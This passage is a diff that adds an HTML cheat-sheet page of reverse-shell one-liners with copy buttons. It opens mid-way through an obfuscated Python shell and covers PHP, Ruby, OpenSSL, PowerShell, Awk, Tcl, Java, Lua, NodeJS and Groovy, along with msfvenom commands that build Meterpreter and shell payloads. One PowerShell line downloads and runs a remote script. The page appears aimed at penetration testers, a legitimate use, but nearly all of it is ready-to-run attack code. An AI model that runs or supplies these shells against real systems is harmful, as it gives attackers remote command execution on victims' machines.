socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</pre>
+<button onclick="copy('python05');">Copy</button>
+
+<h3>PHP:</h3>
+<pre id="php01">php -r '$sock=fsockopen("127.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
+<button onclick="copy('php01');">Copy</button>
+<pre id="php02">php -r '$s=fsockopen("127.0.0.1",8080);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'</pre>
+<button onclick="copy('php02');">Copy</button>
+<pre id="php03">php -r '$s=fsockopen("127.0.0.1",8080);shell_exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
+<button onclick="copy('php03');">Copy</button>
+<pre id="php04">php -r '$s=fsockopen("127.0.0.1",8080);`/bin/sh -i <&3 >&3 2>&3`;'</pre>
+<button onclick="copy('php04');">Copy</button>
+<pre id="php05">php -r '$s=fsockopen("127.0.0.1",8080);system("/bin/sh -i <&3 >&3 2>&3");'</pre>
+<button onclick="copy('php05');">Copy</button>
+<pre id="php06">php -r '$s=fsockopen("127.0.0.1",8080);popen("/bin/sh -i <&3 >&3 2>&3", "r");'</pre>
+<button onclick="copy('php06');">Copy</button>
+
+<h3>Ruby:</h3>
+<pre id="ruby01">ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</pre>
+<button onclick="copy('ruby01');">Copy</button>
+
+<pre id="ruby02">ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
+<button onclick="copy('ruby02');">Copy</button><br>
+
+NOTE: Windows only
+<pre id="ruby03">ruby -rsocket -e 'c=TCPSocket.new("127.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
+<button onclick="copy('ruby03');">Copy</button>
+
+
+
+<h3>OpenSSL:</h3>
+Attacker:
+<pre id="ssl01">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</pre>
+<button onclick="copy('ssl01');">Copy</button>
+<pre id="ssl02">openssl s_server -quiet -key key.pem -cert cert.pem -port 8080</pre>
+<button onclick="copy('ssl02');">Copy</button>
+or
+<pre id="ssl03">ncat --ssl -vv -l -p 8080</pre>
+<button onclick="copy('ssl03');">Copy</button>
+Victim:
+<pre id="ssl04">mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:8080 > /tmp/s; rm /tmp/s</pre>
+<button onclick="copy('ssl04');">Copy</button>
+
+<h3>Powershell:</h3>
+<pre id="ps01">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("127.0.0.1",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
+<button onclick="copy('ps01');">Copy</button>
+<pre id="ps02">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
+<button onclick="copy('ps02');">Copy</button>
+<pre id="ps03">powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')</pre>
+<button onclick="copy('ps03');">Copy</button>
+
+<h3>Awk:</h3>
+<pre id="awk01">awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/8080"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null</pre>
+<button onclick="copy('awk01');">Copy</button>
+
+<h3>TCLsh</h3>
+<pre id="tcl01">echo 'set s [socket 127.0.0.1 8080];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh</pre>
+<button onclick="copy('tcl01');">Copy</button>
+
+<h3>Java:</h3>
+<pre id="java01">r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/8080;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()</pre>
+<button onclick="copy('java01');">Copy</button>
+<pre id="java02">String host="127.0.0.1";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
+<button onclick="copy('java02');">Copy</button>
+<pre id="java03">Thread thread = new Thread(){
+    public void run(){
+        // Reverse shell here
+    }
+}
+thread.start();</pre>
+<button onclick="copy('java03');">Copy</button>
+
+<h3>War:</h3>
+<pre id="war01">msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f war > reverse.war
+strings reverse.war | grep jsp # in order to get the name of the file</pre>
+<button onclick="copy('war01');">Copy</button>
+
+<h3>Lua:</h3>
+Linux only
+<pre id="lua01">lua -e "require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','8080');os.execute('/bin/sh -i <&3 >&3 2>&3');"</pre>
+<button onclick="copy('lua01');">Copy</button><br>
+Windows and Linux
+<pre id="lua02">lua5.1 -e 'local host, port = "127.0.0.1", 8080 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</pre>
+<button onclick="copy('lua02');">Copy</button>
+
+<h3>NodeJS:</h3>
+<pre id="ndjs01">(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "127.0.0.1", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();</pre>
+<button onclick="copy('ndjs01');">Copy</button>
+<pre id="ndjs02">require('child_process').exec('nc -e /bin/sh 127.0.0.1 8080')</pre>
+<button onclick="copy('ndjs02');">Copy</button>
+<pre id="ndjs03">-var x = global.process.mainModule.require
+-x('child_process').exec('nc 127.0.0.1 8080 -e /bin/bash')</pre>
+<button onclick="copy('ndjs03');">Copy</button>
+<pre id="ndjs04">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</pre>
+<button onclick="copy('ndjs04');">Copy</button>
+
+<h3>Groovy:</h3>
+
+<pre id="groovy01">String host="127.0.0.1";
+int port=8080;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
+<button onclick="copy('groovy01');">Copy</button>
+
+<h3>Meterpreter Shell:</h3>
+<pre id="msf01">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f exe > reverse.exe</pre>
+<button onclick="copy('msf01');">Copy</button>
+<pre id="msf02">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f exe > reverse.exe</pre>
+<button onclick="copy('msf02');">Copy</button>
+<pre id="msf03">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f elf >reverse.elf</pre>
+<button onclick="copy('msf03');">Copy</button>
+<pre id="msf04">msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f elf >reverse.elf</pre>
+<button onclick="copy('msf04');">Copy</button>
+<pre id="msf05">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f elf > shell.elf</pre>
+<button onclick="copy('msf05');">Copy</button>
+<pre id="msf06">msfvenom -p windows/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f exe > shell.exe</pre>
+<button onclick="copy('msf06');">Copy</button>
+<pre id="msf07">msfvenom -p osx/x86/shell_reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f macho > shell.macho</pre>
+<button onclick="copy('msf07');">Copy</button>
+<pre id="msf08">msfvenom -p windows/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f asp > shell.asp</pre>
+<button onclick="copy('msf08');">Copy</button>
+<pre id="msf09">msfvenom -p java/jsp_shell_reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f raw > shell.jsp</pre>
+<button onclick="copy('msf09');">Copy</button>
+<pre id="msf10">msfvenom -p java/jsp_shell_reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f war > shell.war</pre>
+<button onclick="copy('msf10');">Copy</button>
+<pre id="msf11">msfvenom -p cmd/unix/reverse_python LHOST="127.0.0.1" LPORT=8080 -f raw > shell.py</pre>
+<button onclick="copy('msf11');">Copy</button>
+<pre id="msf12">msfvenom -p cmd/unix/reverse_bash LHOST="127.0.0.1" LPORT=8080 -f raw > shell.sh</pre>
+<button onclick="copy('msf12');">Copy</button>
+<pre id="msf13">msfvenom -p cmd/unix/reverse_perl LHOST="127.0.0.1" LPORT=8080 -f raw > shell.pl</pre>
+<button onclick="copy('msf13');">Copy</button>
+
+
+<h3>Xterm:</h3>
+<pre id="xterm001">xterm -display 127.0.0.1:1
+Xnest :1
+xhost +targetip</pre>
+<button onclick="copy('xterm001');">Copy</button>
+</div>
+
+</body>
+</html>
